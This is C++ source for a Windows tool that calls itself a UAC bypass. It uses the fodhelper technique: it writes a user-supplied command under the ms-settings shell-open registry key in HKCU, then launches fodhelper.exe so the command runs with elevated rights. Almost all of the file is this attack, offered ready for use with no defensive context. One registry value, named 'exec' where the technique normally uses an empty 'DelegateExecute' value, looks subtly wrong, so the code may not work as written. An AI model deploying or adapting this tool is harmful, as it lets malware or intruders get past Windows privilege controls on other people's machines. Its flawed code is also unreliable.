#include <windows.h>
#include <stdio.h>
#include <memory>
#include <string>
#include <stdexcept>
#include <chrono>
#include <thread>

class RegistryKey {
private:
    HKEY hKey;
    bool isOpen;

public:
    RegistryKey() : hKey(nullptr), isOpen(false) {}
    
    ~RegistryKey() {
        if (isOpen) {
            RegCloseKey(hKey);
        }
    }

    void Open(HKEY rootKey, const wchar_t* subKey, REGSAM access) {
        if (isOpen) {
            RegCloseKey(hKey);
        }
        
        LSTATUS status = RegOpenKeyExW(rootKey, subKey, 0, access, &hKey);
        if (status != ERROR_SUCCESS) {
            throw std::runtime_error("Failed to open registry key");
        }
        isOpen = true;
    }

    void Create(HKEY rootKey, const wchar_t* subKey, REGSAM access) {
        if (isOpen) {
            RegCloseKey(hKey);
        }
        
        DWORD disposition;
        LSTATUS status = RegCreateKeyExW(rootKey, subKey, 0, NULL, 0, access, NULL, &hKey, &disposition);
        if (status != ERROR_SUCCESS) {
            throw std::runtime_error("Failed to create registry key");
        }
        isOpen = true;
    }

    void SetValue(const wchar_t* valueName, const wchar_t* data) {
        if (!isOpen) {
            throw std::runtime_error("Registry key is not open");
        }

        LSTATUS status = RegSetValueExW(hKey, valueName, 0, REG_SZ, 
            reinterpret_cast<const BYTE*>(data), 
            static_cast<DWORD>((wcslen(data) + 1) * sizeof(wchar_t)));
        
        if (status != ERROR_SUCCESS) {
            throw std::runtime_error("Failed to set registry value");
        }
    }

    HKEY GetHandle() const { return hKey; }
};

class UACBypass {
private:
    static constexpr const wchar_t* SETTINGS_KEY = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    static constexpr const wchar_t* FODHELPER_PATH = L"C:\\Windows\\System32\\fodhelper.exe";

public:
    static void Execute(const std::wstring& command) {
        try {
            // Registry operations
            RegistryKey regKey;
            regKey.Create(HKEY_CURRENT_USER, SETTINGS_KEY, KEY_WRITE);
            regKey.SetValue(L"", command.c_str());
            regKey.SetValue(L"exec", L"");

            // Wait for a moment
            std::this_thread::sleep_for(std::chrono::seconds(5));

            // Execute fodhelper
            SHELLEXECUTEINFOW sei = { sizeof(sei) };
            sei.lpVerb = L"runas";
            sei.lpFile = FODHELPER_PATH;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;

            if (!ShellExecuteExW(&sei)) {
                DWORD err = GetLastError();
                if (err == ERROR_CANCELLED) {
                    throw std::runtime_error("The user refused to allow privileges elevation");
                } else {
                    throw std::runtime_error("Unexpected error during execution");
                }
            }
        }
        catch (const std::exception& e) {
            throw std::runtime_error(std::string("UAC bypass failed: ") + e.what());
        }
    }
};

int wmain(int argc, wchar_t* argv[]) {
    try {
        if (argc != 2) {
            wprintf(L"Usage: UacBypass.exe <file.exe or command>\n");
            return 1;
        }

        UACBypass::Execute(argv[1]);
        wprintf(L"Execution successful.\n");
        return 0;
    }
    catch (const std::exception& e) {
        wprintf(L"Error: %hs\n", e.what());
        return 1;
    }
}
